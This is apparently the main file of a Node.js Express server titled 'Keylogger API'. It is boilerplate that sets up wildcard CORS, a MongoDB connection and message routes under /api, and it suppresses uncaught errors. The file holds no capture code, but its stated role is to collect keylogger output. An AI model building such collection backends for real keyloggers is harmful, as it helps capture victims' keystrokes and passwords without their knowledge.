//-- Keylogger API --//
//============================================

//bringing packages
    var express    = require('express');
    var bodyParser = require('body-parser');
    var app        = express();
    var morgan     = require('morgan');
    var mongoose   = require('mongoose');
    var config     = require('./config');


// setting up the app
    app.use(morgan('dev')); // To log requests on console
    //setting CORS
    app.use(function(req, res, next){
        res.header("Access-Control-Allow-Origin", "*");
        res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
        res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
        next();
    });
    //setting body parser
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(bodyParser.json());
    
    var port = process.env.PORT || 8080;

// Bringing models
    mongoose.connect(config.database); //connecting to the database setted up on config.js
    var Message = require('./models/message');



// API ROUTING
// ===========================================
    
    var router = express.Router();

  // Bringing routes from controllers
    // on routes that end in / (main)        // requests for the main route (/) will direct request to the /message controller
    //--------------------------------------
    require('./routes/message')(app, router);


  // Registering routes
    app.use('/api', router);



// STARTING SERVER
// ===========================================
    app.listen(port);
    console.log('Up and running on port '+port+'!');





// Error supression                                                     // Yeah, i know that this isn't a good practice, but...
    process.on('uncaughtException', function(err){
        console.log('Something bad happen:' + err);
    });



















